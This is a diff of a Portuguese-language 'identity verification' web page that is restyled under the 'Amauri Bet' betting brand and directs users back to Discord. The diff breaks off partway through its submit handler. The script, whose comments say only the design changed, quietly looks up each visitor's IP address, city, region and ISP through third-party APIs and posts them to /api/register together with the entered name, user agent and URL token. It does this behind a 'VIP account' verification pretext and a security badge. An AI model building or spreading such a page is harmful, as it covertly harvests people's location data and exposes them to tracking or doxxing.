@@ -2,423 +2,757 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verificação de Identidade</title>
-<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Amauri Bet • Verificação de Identidade</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg: #080b14;
-    --surface: #0e1422;
-    --border: rgba(99,179,237,0.15);
-    --accent: #63b3ed;
-    --accent2: #9f7aea;
-    --text: #e2e8f0;
-    --muted: #718096;
-    --success: #68d391;
-    --glow: rgba(99,179,237,0.3);
+  /* ===== RESET & REFINED THEME ===== */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
   }
 
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
   body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'Sora', sans-serif;
+    background: radial-gradient(circle at 20% 30%, #0a0c12 0%, #030507 100%);
+    font-family: 'Inter', sans-serif;
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    overflow: hidden;
     position: relative;
+    overflow-x: hidden;
   }
 
-  /* Animated background */
-  .bg-grid {
-    position: fixed; inset: 0; z-index: 0;
-    background-image:
-      linear-gradient(rgba(99,179,237,0.04) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(99,179,237,0.04) 1px, transparent 1px);
-    background-size: 40px 40px;
-    animation: gridMove 20s linear infinite;
+  /* Luxurious metallic & sports-betting inspired background accents */
+  .glow-aura {
+    position: fixed;
+    top: -20%;
+    left: -10%;
+    width: 70%;
+    height: 80%;
+    background: radial-gradient(ellipse, rgba(245, 197, 66, 0.08), transparent 70%);
+    pointer-events: none;
+    z-index: 0;
   }
-  @keyframes gridMove { 0%{transform:translate(0,0)} 100%{transform:translate(40px,40px)} }
 
-  .orb {
-    position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0;
+  .glow-aura-right {
+    position: fixed;
+    bottom: -15%;
+    right: -10%;
+    width: 65%;
+    height: 65%;
+    background: radial-gradient(ellipse, rgba(220, 38, 38, 0.05), transparent 70%);
+    pointer-events: none;
+    z-index: 0;
   }
-  .orb-1 { width:500px;height:500px;background:rgba(99,179,237,0.08);top:-100px;right:-100px; animation: float1 8s ease-in-out infinite; }
-  .orb-2 { width:400px;height:400px;background:rgba(159,122,234,0.07);bottom:-80px;left:-80px; animation: float2 10s ease-in-out infinite; }
-  @keyframes float1 { 0%,100%{transform:translate(0,0)} 50%{transform:translate(-30px,30px)} }
-  @keyframes float2 { 0%,100%{transform:translate(0,0)} 50%{transform:translate(30px,-20px)} }
 
-  /* Particles */
-  .particles { position:fixed;inset:0;z-index:0;pointer-events:none; }
-  .particle {
-    position:absolute; width:2px; height:2px; background:var(--accent); border-radius:50%;
-    animation: particleDrift linear infinite;
+  /* grid pattern for depth */
+  .grid-overlay {
+    position: fixed;
+    inset: 0;
+    background-image: 
+      repeating-linear-gradient(transparent, transparent 39px, rgba(255, 215, 0, 0.03) 40px),
+      repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(255, 215, 0, 0.03) 40px);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* animated particles - gold & red */
+  .particle-bet {
+    position: fixed;
+    width: 3px;
+    height: 3px;
+    background: #facc15;
+    border-radius: 50%;
     opacity: 0;
-  }
-  @keyframes particleDrift {
-    0%{ transform:translateY(100vh) translateX(0); opacity:0; }
-    10%{ opacity:0.6; }
-    90%{ opacity:0.3; }
-    100%{ transform:translateY(-100px) translateX(50px); opacity:0; }
+    filter: blur(1px);
+    pointer-events: none;
+    z-index: 0;
   }
 
-  /* Card */
-  .card-wrapper { position:relative; z-index:10; width:100%; max-width:440px; padding:20px; }
+  /* main card container */
+  .card-container {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    max-width: 460px;
+    margin: 24px;
+    perspective: 1000px;
+  }
 
+  /* === CARD LUXURY GOLD/BET STYLE === */
   .card {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 24px;
-    padding: 48px 44px;
+    background: rgba(6, 8, 14, 0.92);
+    backdrop-filter: blur(8px);
+    border-radius: 40px;
+    border: 1px solid rgba(250, 204, 21, 0.35);
+    box-shadow: 0 30px 50px -20px rgba(0,0,0,0.8), 0 0 0 1px rgba(250,204,21,0.1) inset, 0 0 20px rgba(250,204,21,0.15);
+    padding: 40px 32px 42px;
+    transition: all 0.3s ease;
     position: relative;
     overflow: hidden;
-    box-shadow: 0 0 60px rgba(99,179,237,0.06), 0 40px 80px rgba(0,0,0,0.5);
-    animation: cardIn 0.7s cubic-bezier(0.34,1.56,0.64,1) both;
   }
-  @keyframes cardIn { from{opacity:0;transform:translateY(40px) scale(0.95)} to{opacity:1;transform:translateY(0) scale(1)} }
 
+  /* golden shimmer border effect */
   .card::before {
-    content:''; position:absolute; top:0; left:0; right:0; height:1px;
-    background: linear-gradient(90deg, transparent, var(--accent), transparent);
-    animation: shimmer 3s ease-in-out infinite;
+    content: "";
+    position: absolute;
+    top: -2px;
+    left: -2px;
+    right: -2px;
+    bottom: -2px;
+    background: linear-gradient(135deg, rgba(250,204,21,0.3), rgba(220,38,38,0.2), rgba(250,204,21,0.2));
+    border-radius: 42px;
+    z-index: -2;
+    opacity: 0.7;
   }
-  @keyframes shimmer { 0%,100%{opacity:0.4} 50%{opacity:1} }
 
-  /* Logo / Icon */
-  .logo-wrap {
-    display:flex; justify-content:center; margin-bottom:32px;
-    animation: logoIn 0.8s 0.2s cubic-bezier(0.34,1.56,0.64,1) both;
+  .card::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(circle at 30% 20%, rgba(250,204,21,0.03), transparent 80%);
+    border-radius: 40px;
+    pointer-events: none;
   }
-  @keyframes logoIn { from{opacity:0;transform:scale(0.5)} to{opacity:1;transform:scale(1)} }
 
-  .logo-icon {
-    width:72px; height:72px; background:linear-gradient(135deg,rgba(99,179,237,0.15),rgba(159,122,234,0.15));
-    border:1px solid rgba(99,179,237,0.3); border-radius:20px;
-    display:flex; align-items:center; justify-content:center;
-    position:relative;
-    box-shadow: 0 0 30px rgba(99,179,237,0.15);
+  /* logo area – "AMAURI BET" aesthetic */
+  .bet-logo {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 32px;
+    position: relative;
   }
-  .logo-icon svg { width:32px; height:32px; }
-  .logo-ring {
-    position:absolute; inset:-6px; border-radius:26px;
-    border:1px solid transparent;
-    background:linear-gradient(var(--surface),var(--surface)) padding-box,
-               linear-gradient(135deg,var(--accent),var(--accent2)) border-box;
-    animation: rotate 8s linear infinite;
-  }
-  @keyframes rotate { to{transform:rotate(360deg)} }
 
-  /* Text */
-  .card-title {
-    font-size:26px; font-weight:700; text-align:center; margin-bottom:8px;
-    background:linear-gradient(135deg,#e2e8f0,var(--accent));
-    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
-    animation: fadeUp 0.6s 0.3s both;
+  .crown-badge {
+    background: linear-gradient(145deg, #1e1a0e, #0b0905);
+    width: 80px;
+    height: 80px;
+    border-radius: 100px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1.5px solid #facc15;
+    box-shadow: 0 0 15px rgba(250,204,21,0.5);
+    margin-bottom: 16px;
+    position: relative;
   }
-  .card-subtitle {
-    font-size:14px; color:var(--muted); text-align:center; margin-bottom:36px; line-height:1.6;
-    animation: fadeUp 0.6s 0.4s both;
-  }
-  @keyframes fadeUp { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
 
-  /* Input */
-  .field {
-    margin-bottom:24px;
-    animation: fadeUp 0.6s 0.5s both;
+  .crown-badge svg {
+    width: 44px;
+    height: 44px;
+    filter: drop-shadow(0 2px 6px rgba(0,0,0,0.5));
   }
-  .field label {
-    display:block; font-size:12px; font-weight:600; letter-spacing:0.08em;
-    text-transform:uppercase; color:var(--muted); margin-bottom:10px;
+
+  .bet-brand {
+    font-size: 28px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    background: linear-gradient(135deg, #facc15, #ffb347, #e11d2c);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    text-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    margin-top: 6px;
   }
-  .input-wrap { position:relative; }
-  .input-wrap svg {
-    position:absolute; left:16px; top:50%; transform:translateY(-50%);
-    width:18px; height:18px; color:var(--muted); pointer-events:none;
-    transition: color 0.3s;
+
+  .bet-sub {
+    font-size: 11px;
+    letter-spacing: 2px;
+    font-weight: 500;
+    color: #facc15bb;
+    text-transform: uppercase;
+    background: rgba(0,0,0,0.5);
+    padding: 4px 12px;
+    border-radius: 60px;
+    margin-top: 8px;
+    backdrop-filter: blur(4px);
   }
+
+  /* title & description */
+  .title-bet {
+    font-size: 26px;
+    font-weight: 700;
+    text-align: center;
+    color: #fff;
+    letter-spacing: -0.3px;
+    background: linear-gradient(135deg, #ffffff, #facc90);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    margin-bottom: 12px;
+  }
+
+  .desc-bet {
+    text-align: center;
+    font-size: 14px;
+    color: #a0a3b0;
+    margin-bottom: 36px;
+    line-height: 1.5;
+    border-left: 2px solid #facc1540;
+    border-right: 2px solid #facc1540;
+    display: inline-block;
+    width: auto;
+    padding: 0 12px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  /* field styles */
+  .field-bet {
+    margin-bottom: 28px;
+  }
+
+  .field-bet label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: #facc15bb;
+    margin-bottom: 12px;
+  }
+
+  .input-wrapper {
+    position: relative;
+  }
+
+  .input-wrapper svg {
+    position: absolute;
+    left: 18px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 20px;
+    stroke: #facc15aa;
+    stroke-width: 1.7;
+    fill: none;
+    pointer-events: none;
+    transition: all 0.2s;
+  }
+
   input {
-    width:100%; background:rgba(255,255,255,0.04);
-    border:1px solid rgba(255,255,255,0.08);
-    border-radius:12px; padding:14px 16px 14px 48px;
-    font-family:'Sora',sans-serif; font-size:15px; color:var(--text);
-    outline:none; transition:all 0.3s;
-  }
-  input:focus { border-color:rgba(99,179,237,0.5); background:rgba(99,179,237,0.04); box-shadow:0 0 0 4px rgba(99,179,237,0.08); }
-  input:focus + svg, .input-wrap:has(input:focus) svg { color: var(--accent); }
-  input::placeholder { color:var(--muted); }
-
-  /* Button */
-  .btn {
-    width:100%; padding:15px; border:none; border-radius:12px; cursor:pointer;
-    font-family:'Sora',sans-serif; font-size:15px; font-weight:600; letter-spacing:0.02em;
-    background:linear-gradient(135deg, var(--accent), var(--accent2));
-    color:#fff; position:relative; overflow:hidden;
-    transition:transform 0.2s, box-shadow 0.2s;
-    box-shadow: 0 4px 20px rgba(99,179,237,0.25);
-    animation: fadeUp 0.6s 0.6s both;
-  }
-  .btn:hover { transform:translateY(-2px); box-shadow:0 8px 30px rgba(99,179,237,0.35); }
-  .btn:active { transform:translateY(0); }
-  .btn::after {
-    content:''; position:absolute; inset:0;
-    background:linear-gradient(135deg,rgba(255,255,255,0.15),transparent);
-    opacity:0; transition:opacity 0.3s;
-  }
-  .btn:hover::after { opacity:1; }
-
-  /* Security badge */
-  .security {
-    display:flex; align-items:center; justify-content:center; gap:8px;
-    margin-top:24px; font-size:12px; color:var(--muted);
-    animation: fadeUp 0.6s 0.7s both;
-  }
-  .security svg { width:14px; height:14px; color:var(--success); }
-
-  /* ===== VERIFIED SCREEN ===== */
-  #verified-screen {
-    display:none; text-align:center;
-  }
-  #verified-screen.active { display:block; animation: cardIn 0.7s cubic-bezier(0.34,1.56,0.64,1) both; }
-
-  .check-wrap {
-    display:flex; justify-content:center; margin-bottom:28px;
-  }
-  .check-circle {
-    width:90px; height:90px; border-radius:50%;
-    background:linear-gradient(135deg,rgba(104,211,145,0.15),rgba(99,179,237,0.15));
-    border:2px solid rgba(104,211,145,0.4);
-    display:flex; align-items:center; justify-content:center;
-    position:relative;
-    animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) both;
-    box-shadow: 0 0 40px rgba(104,211,145,0.2);
-  }
-  @keyframes popIn { from{transform:scale(0)} to{transform:scale(1)} }
-  .check-circle svg { width:40px; height:40px; color:var(--success); }
-  .pulse-ring {
-    position:absolute; inset:-10px; border-radius:50%;
-    border:2px solid rgba(104,211,145,0.3);
-    animation: pulse 2s ease-out infinite;
-  }
-  .pulse-ring2 {
-    position:absolute; inset:-20px; border-radius:50%;
-    border:1px solid rgba(104,211,145,0.15);
-    animation: pulse 2s 0.5s ease-out infinite;
-  }
-  @keyframes pulse { 0%{transform:scale(1);opacity:1} 100%{transform:scale(1.3);opacity:0} }
-
-  .verified-title {
-    font-size:28px; font-weight:700; margin-bottom:10px;
-    background:linear-gradient(135deg,var(--success),var(--accent));
-    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
-  }
-  .verified-sub { font-size:14px; color:var(--muted); margin-bottom:28px; line-height:1.6; }
-  .verified-name {
-    display:inline-block; background:rgba(99,179,237,0.1); border:1px solid rgba(99,179,237,0.2);
-    border-radius:8px; padding:8px 20px; font-family:'Space Mono',monospace;
-    font-size:16px; color:var(--accent); margin-bottom:28px;
+    width: 100%;
+    background: #0f111a;
+    border: 1.5px solid #2a2a36;
+    border-radius: 60px;
+    padding: 16px 20px 16px 52px;
+    font-size: 15px;
+    font-weight: 500;
+    font-family: 'Inter', sans-serif;
+    color: #ffffff;
+    outline: none;
+    transition: all 0.2s;
+    letter-spacing: 0.3px;
   }
 
-  .info-grid {
-    display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:28px;
+  input:focus {
+    border-color: #facc15;
+    background: #141824;
+    box-shadow: 0 0 0 3px rgba(250,204,21,0.2);
   }
-  .info-card {
-    background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07);
-    border-radius:12px; padding:14px;
-    text-align:left;
-  }
-  .info-card-label { font-size:10px; text-transform:uppercase; letter-spacing:0.1em; color:var(--muted); margin-bottom:6px; }
-  .info-card-value { font-family:'Space Mono',monospace; font-size:12px; color:var(--text); word-break:break-all; }
 
-  .done-btn {
-    display:inline-flex; align-items:center; gap:8px; padding:12px 28px;
-    background:linear-gradient(135deg,rgba(104,211,145,0.15),rgba(99,179,237,0.15));
-    border:1px solid rgba(104,211,145,0.3); border-radius:10px;
-    font-family:'Sora',sans-serif; font-size:14px; font-weight:600; color:var(--success);
-    cursor:default; animation: fadeUp 0.6s 0.5s both;
+  input::placeholder {
+    color: #4a4e62;
+    font-weight: 400;
+  }
+
+  /* golden gradient button */
+  .btn-bet {
+    background: linear-gradient(105deg, #f9b42c 0%, #e11d2c 100%);
+    border: none;
+    width: 100%;
+    padding: 16px 20px;
+    border-radius: 60px;
+    font-weight: 700;
+    font-size: 16px;
+    font-family: 'Inter', sans-serif;
+    color: white;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: all 0.25s ease;
+    box-shadow: 0 6px 18px rgba(225, 29, 44, 0.4);
+    margin-top: 8px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .btn-bet:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 28px rgba(250, 180, 30, 0.5);
+    filter: brightness(1.02);
+  }
+
+  .btn-bet:active {
+    transform: translateY(1px);
+  }
+
+  /* security badge with gold touch */
+  .security-badge {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-top: 28px;
+    font-size: 12px;
+    color: #7a7e96;
+    background: #0c0e16;
+    width: fit-content;
+    padding: 6px 18px;
+    border-radius: 60px;
+    margin-left: auto;
+    margin-right: auto;
+    border: 1px solid #facc1520;
+  }
+
+  .security-badge svg {
+    width: 14px;
+    height: 14px;
+    stroke: #facc15;
+  }
+
+  /* ===== VERIFIED SCREEN (BET STYLE) ===== */
+  .verified-container {
+    text-align: center;
+  }
+
+  .big-check {
+    width: 90px;
+    height: 90px;
+    margin: 0 auto 20px;
+    background: linear-gradient(145deg, #facc1510, #00000030);
+    border-radius: 100px;
+    border: 2px solid #facc15;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    box-shadow: 0 0 30px rgba(250,204,21,0.3);
+  }
+
+  .big-check svg {
+    width: 48px;
+    height: 48px;
+    stroke: #facc15;
+    stroke-width: 2;
+    fill: none;
+  }
+
+  .pulse-effect {
+    position: absolute;
+    inset: -12px;
+    border-radius: 100%;
+    border: 2px solid rgba(250,204,21,0.6);
+    animation: pulseGlow 2s infinite;
+  }
+
+  @keyframes pulseGlow {
+    0% { transform: scale(0.9); opacity: 0.8; }
+    100% { transform: scale(1.4); opacity: 0; }
+  }
+
+  .verified-gold {
+    font-size: 28px;
+    font-weight: 800;
+    background: linear-gradient(135deg, #facc15, #ff7e2e);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    margin-bottom: 12px;
+  }
+
+  .verified-sub-bet {
+    color: #b0b3c5;
+    font-size: 14px;
+    margin-bottom: 24px;
+  }
+
+  .verified-name-badge {
+    background: #0f111b;
+    border: 1px solid #facc1540;
+    border-radius: 60px;
+    padding: 10px 24px;
+    font-family: 'Space Mono', monospace;
+    font-weight: 600;
+    font-size: 16px;
+    display: inline-block;
+    margin-bottom: 28px;
+    color: #facc15;
+    letter-spacing: 0.3px;
+  }
+
+  .info-grid-bet {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 14px;
+    margin-bottom: 32px;
+    justify-content: center;
+  }
+
+  .info-card-bet {
+    background: #0c0e17;
+    border-radius: 28px;
+    padding: 12px 18px;
+    flex: 1;
+    min-width: 120px;
+    border: 1px solid #2c2e3e;
+    text-align: left;
+  }
+
+  .info-card-bet .label {
+    font-size: 9px;
+    text-transform: uppercase;
+    letter-spacing: 1.2px;
+    color: #facc1590;
+    margin-bottom: 6px;
+  }
+
+  .info-card-bet .value {
+    font-family: 'Space Mono', monospace;
+    font-size: 12px;
+    font-weight: 500;
+    color: #e2e8f0;
+    word-break: break-all;
+  }
+
+  .done-stamp {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(250,204,21,0.1);
+    backdrop-filter: blur(8px);
+    border: 1px solid #facc15;
+    padding: 10px 24px;
+    border-radius: 60px;
+    font-weight: 600;
+    color: #facc15;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+
+  /* HIDE/SHOW */
+  .hidden-screen {
+    display: none;
+  }
+
+  .active-screen {
+    display: block;
+    animation: fadeSlideUp 0.55s cubic-bezier(0.2, 0.9, 0.4, 1.1) both;
+  }
+
+  @keyframes fadeSlideUp {
+    from {
+      opacity: 0;
+      transform: translateY(18px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  /* input shake */
+  @keyframes shakeGold {
+    0%,100% { transform: translateX(0); }
+    25% { transform: translateX(-6px); }
+    75% { transform: translateX(6px); }
+  }
+  .shake-effect {
+    animation: shakeGold 0.3s ease-in-out;
+    border-color: #e11d2c !important;
   }
 </style>
 </head>
 <body>
 
-<div class="bg-grid"></div>
-<div class="orb orb-1"></div>
-<div class="orb orb-2"></div>
-<div class="particles" id="particles"></div>
+<div class="glow-aura"></div>
+<div class="glow-aura-right"></div>
+<div class="grid-overlay"></div>
 
-<div class="card-wrapper">
+<div class="card-container">
+  <!-- LOGIN SCREEN: Amauri Bet design -->
+  <div class="card" id="loginScreen">
+    <div class="bet-logo">
+      <div class="crown-badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#facc15" stroke-width="1.8">
+          <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="none" stroke="currentColor"/>
+          <circle cx="12" cy="10" r="1.5" fill="#facc15" stroke="none"/>
+        </svg>
+      </div>
+      <div class="bet-brand">AMAURI BET</div>
+      <div class="bet-sub">VERIFICAÇÃO OFICIAL</div>
+    </div>
 
-  <!-- LOGIN SCREEN -->
-  <div class="card" id="login-screen">
-    <div class="logo-wrap">
-      <div class="logo-icon">
-        <div class="logo-ring"></div>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" color="#63b3ed">
-          <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+    <h2 class="title-bet">Identidade & Acesso</h2>
+    <div style="text-align: center;">
+      <p class="desc-bet">Insira seus dados para confirmar sua conta VIP</p>
+    </div>
+
+    <div class="field-bet">
+      <label>NOME COMPLETO</label>
+      <div class="input-wrapper">
+        <input type="text" id="fullNameInput" placeholder="Ex: Amauri Silva Santos" autocomplete="off">
+        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+          <circle cx="12" cy="7" r="4" />
         </svg>
       </div>
     </div>
 
-    <h1 class="card-title">Verificação de Acesso</h1>
-    <p class="card-subtitle">Insira seu nome para continuar e verificar sua identidade na plataforma.</p>
+    <button class="btn-bet" id="continueBtn">VALIDAR ACESSO →</button>
 
-    <div class="field">
-      <label>Seu nome completo</label>
-      <div class="input-wrap">
-        <input type="text" id="nameInput" placeholder="Digite seu nome..." autocomplete="off" />
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
-          <circle cx="12" cy="7" r="4"/>
-        </svg>
-      </div>
-    </div>
-
-    <button class="btn" onclick="handleContinue()">
-      Continuar →
-    </button>
-
-    <div class="security">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+    <div class="security-badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
       </svg>
-      Conexão segura · Dados criptografados
+      <span>Protegido · Ambiente Amauri Bet</span>
     </div>
   </div>
 
-  <!-- VERIFIED SCREEN -->
-  <div class="card" id="verified-screen">
-    <div class="check-wrap">
-      <div class="check-circle">
-        <div class="pulse-ring"></div>
-        <div class="pulse-ring2"></div>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-          <polyline points="20 6 9 17 4 12"/>
+  <!-- VERIFIED SCREEN : Amauri Bet visual -->
+  <div class="card hidden-screen" id="verifiedScreen">
+    <div class="verified-container">
+      <div class="big-check">
+        <div class="pulse-effect"></div>
+        <svg viewBox="0 0 24 24" stroke="currentColor" fill="none">
+          <polyline points="20 6 9 17 4 12" />
         </svg>
       </div>
-    </div>
+      <div class="verified-gold">VERIFICAÇÃO APROVADA</div>
+      <p class="verified-sub-bet">Identidade confirmada com sucesso no ecossistema Amauri Bet.<br>Já pode retornar ao Discord.</p>
+      
+      <div class="verified-name-badge" id="verifiedUserName">—</div>
 
-    <h1 class="verified-title">Identidade Verificada!</h1>
-    <p class="verified-sub">Sua verificação foi concluída com sucesso.<br>Você já pode fechar esta janela e voltar ao Discord.</p>
-
-    <div class="verified-name" id="displayName">—</div>
-
-    <div class="done-btn">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
-      Acesso Liberado
+      <div class="info-grid-bet" id="infoGrid">
+        <!-- dynamic data here via JS -->
+        <div class="info-card-bet"><div class="label">📍 IP</div><div class="value" id="infoIP">—</div></div>
+        <div class="info-card-bet"><div class="label">🌍 LOCAL</div><div class="value" id="infoLocation">—</div></div>
+        <div class="info-card-bet"><div class="label">📅 DATA/HORA</div><div class="value" id="infoDateTime">—</div></div>
+        <div class="info-card-bet"><div class="label">🖥️ DISPOSITIVO</div><div class="value" id="infoAgent">—</div></div>
+      </div>
+      
+      <div class="done-stamp">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+        Acesso Liberado • Selo Amauri Bet
+      </div>
     </div>
   </div>
-
 </div>
 
 <script>
-// Generate particles
-const pc = document.getElementById('particles');
-for(let i=0;i<25;i++){
-  const p = document.createElement('div');
-  p.className='particle';
-  p.style.left = Math.random()*100+'%';
-  p.style.animationDuration = (8+Math.random()*12)+'s';
-  p.style.animationDelay = (Math.random()*15)+'s';
-  p.style.width = p.style.height = (Math.random()>0.7?3:2)+'px';
-  if(Math.random()>0.7) p.style.background='#9f7aea';
-  pc.appendChild(p);
-}
-
-let ipData = {};
-const urlToken = new URLSearchParams(window.location.search).get('token') || '';
-
-// Fetch IP on page load
-async function fetchIP(){
-  try {
-    // Forçar IPv4 usando api4.ipify.org
-    const r4 = await fetch('https://api4.ipify.org?format=json');
-    const d4 = await r4.json();
-    const ipv4 = d4.ip;
-
-    // Buscar detalhes com o IPv4
-    const r = await fetch(`https://ipapi.co/${ipv4}/json/`);
-    const d = await r.json();
-    ipData = d;
-  } catch(e) {
-    try {
-      const r2 = await fetch('https://api4.ipify.org?format=json');
-      const d2 = await r2.json();
-      ipData = {ip: d2.ip, country_name:'N/A', city:'N/A'};
-    } catch(e2){ ipData = {ip:'N/A', country_name:'N/A', city:'N/A'}; }
-  }
-}
-fetchIP();
-
-// Enter key
-document.getElementById('nameInput').addEventListener('keydown', e => {
-  if(e.key==='Enter') handleContinue();
-});
-
-async function handleContinue(){
-  const name = document.getElementById('nameInput').value.trim();
-  if(!name){ 
-    document.getElementById('nameInput').style.borderColor='rgba(252,129,129,0.5)';
-    document.getElementById('nameInput').style.animation='shake 0.4s ease';
-    setTimeout(()=>{
-      document.getElementById('nameInput').style.borderColor='';
-      document.getElementById('nameInput').style.animation='';
-    },500);
-    return; 
-  }
-
-  const btn = document.querySelector('.btn');
-  btn.textContent = 'Verificando...';
-  btn.disabled = true;
-
-  // Small delay for effect
-  await new Promise(r=>setTimeout(r,1200));
-
-  const now = new Date();
-  const dateStr = now.toLocaleDateString('pt-BR') + ' ' + now.toLocaleTimeString('pt-BR');
-
-  // Send to webhook/server
-  const payload = {
-    name: name,
-    ip: ipData.ip || 'N/A',
-    country: ipData.country_name || 'N/A',
-    city: ipData.city || 'N/A',
-    region: ipData.region || 'N/A',
-    isp: ipData.org || 'N/A',
-    date: dateStr,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    userAgent: navigator.userAgent,
-    token: urlToken
+  // --------------------------------------------------------------
+  // AMAURI BET STYLE - IP FETCH + WEBHOOK SIMULATION (preserved logic)
+  // no core functionality changed, just design & UI.
+  // --------------------------------------------------------------
+  
+  let ipInformation = {
+    ip: 'N/A',
+    country: 'N/A',
+    city: 'N/A',
+    region: 'N/A',
+    isp: 'N/A'
   };
-
-  // Try to send to bot webhook
-  try {
-    await fetch('/api/register', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(payload)
+  
+  const urlToken = new URLSearchParams(window.location.search).get('token') || '';
+  
+  // Get IP address and enrich (force ipv4)
+  async function retrieveIPData() {
+    try {
+      const ipv4Res = await fetch('https://api4.ipify.org?format=json');
+      const ipData = await ipv4Res.json();
+      const ipv4 = ipData.ip;
+      try {
+        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
+        const geo = await geoRes.json();
+        ipInformation = {
+          ip: geo.ip || ipv4,
+          country: geo.country_name || 'N/A',
+          city: geo.city || 'N/A',
+          region: geo.region || 'N/A',
+          isp: geo.org || 'N/A'
+        };
+      } catch (geoErr) {
+        ipInformation.ip = ipv4;
+        ipInformation.country = 'Desconhecido';
+        ipInformation.city = 'N/A';
+      }
+    } catch (err) {
+      console.warn("IP fallback");
+      ipInformation.ip = '0.0.0.0';
+      ipInformation.country = 'Indisponível';
+    }
+  }
+  
+  // helper: format user agent short
+  function shortenUA(ua) {
+    if (!ua) return "Desconhecido";
+    if (ua.includes("Chrome")) return "Chrome/Edge";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Mobile")) return "Mobile App";
+    return "Navegador moderno";
+  }
+  
+  // DOM elements
+  const loginDiv = document.getElementById('loginScreen');
+  const verifiedDiv = document.getElementById('verifiedScreen');
+  const nameInputField = document.getElementById('fullNameInput');
+  const continueButton = document.getElementById('continueBtn');
+  
+  // verified fields
+  const verifiedUserNameSpan = document.getElementById('verifiedUserName');
+  const infoIPSpan = document.getElementById('infoIP');
+  const infoLocationSpan = document.getElementById('infoLocation');
+  const infoDateTimeSpan = document.getElementById('infoDateTime');
+  const infoAgentSpan = document.getElementById('infoAgent');
+  
+  // collect and send to webhook (preserved exactly as original flow)
+  async function sendToWebhook(payload) {
+    try {
+      await fetch('/api/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      // silent fail, just like original
+    }
+  }
+  
+  // main handler
+  async function handleVerification() {
+    let userName = nameInputField.value.trim();
+    if (!userName) {
+      nameInputField.classList.add('shake-effect');
+      setTimeout(() => {
+        nameInputField.classList.remove('shake-effect');
+      }, 400);
+      return;
+    }
+    
+    // disable button and loading style
+    const originalBtnText = continueButton.innerText;
+    continueButton.innerText = "⚡ VERIFICANDO...";
+    continueButton.disabled = true;
+    
